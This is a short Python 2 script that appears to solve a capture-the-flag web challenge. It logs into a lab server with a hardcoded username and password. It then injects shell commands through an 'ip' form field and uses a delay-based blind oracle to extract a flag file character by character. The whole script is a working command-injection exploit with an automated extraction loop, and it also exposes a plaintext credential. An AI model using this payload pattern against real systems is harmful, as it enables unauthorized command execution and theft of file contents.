import urllib
import urllib2
import requests
import sys
url = 'https://172.27.20.32:8443/login.php'
values = {'username': 'sumedh',
          'password': 'CXbXPGbNfXNvBEL'}

session = requests.session()
r = session.post(url, data=values, verify=False)
#print r.content

length = 38 - 6 #for flag{}

def getChar(num):
	if num <= 25:
		return chr(ord('a') + num)
	if num <= 51:
		return chr(ord('A') + (num - 26))
	return str(num - 52)

def getString(i, c):
	ans = ""
	j = 0
	while j < i:
		ans = ans + "."
		j = j + 1
	ans = ans + c
	j = j + 1
	while j < length:
		ans = ans + "."
		j = j + 1
	return ans

url = 'https://172.27.20.32:8443/chal6.php'
flag = ""
for i in range(length):
	print "Finding ", i, "th character"
	for j in range(62):
		c = getChar(j)
		s = getString(i, c)
		print s
		values = {'ip' : 'google.com"; if [ $(/bin/cat "/flags/sumedh.flag") == $(grep "flag{' + str(s) + '}" "/flags/sumedh.flag") ]; then { for(( c=1; c<=1000000; c++ )); do a=1; done }; fi; /bin/cat "/flags/sumedh.flag'}
		r = session.post(url, data=values, verify = False)
		if r.content.find("<script>alert('Host seems down')</script>") == 0:
			print "Character " + str(i) + " is " + str(c)
			flag = flag + str(c)
			break
			#sys.stdout.write(c)
			#sys.exit(0)
print "\nPassword Found: ", flag
